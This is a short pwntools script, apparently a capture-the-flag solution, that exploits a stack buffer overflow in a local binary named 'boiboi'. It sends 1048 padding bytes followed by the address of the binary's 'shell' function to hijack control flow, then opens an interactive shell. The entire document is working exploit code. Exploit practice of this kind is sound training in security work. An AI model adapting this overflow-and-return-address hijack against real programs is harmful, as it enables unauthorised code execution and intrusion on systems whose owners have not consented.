from pwn import *

e = ELF('./boiboi')

r = process('./boiboi')

payload = b'A'*1048 + p64(e.symbols['shell'])
r.sendline(payload)

r.interactive()